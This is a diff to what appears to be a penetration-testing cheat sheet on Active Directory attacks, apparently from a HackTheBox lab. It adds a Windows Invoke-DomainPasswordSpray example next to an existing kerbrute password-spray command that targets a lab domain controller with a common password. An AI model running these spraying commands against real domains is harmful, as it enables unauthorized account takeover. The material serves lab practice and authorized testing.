@@ -85,8 +85,14 @@ ridsetreferences              : CN=RID Set,CN=DC1,OU=Domain Controllers,DC=corp,
 dnshostname                   : DC1.corp.com
 ```
 ### Domain PasswordSpray
+Linux
 ```
 ./kerbrute_linux_amd64 passwordspray --dc 10.10.11.60 -d frizz.htb userlist "Welcome1!" -v
+```
+windows
+```
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 ### Domain Password Brute-force
 ```
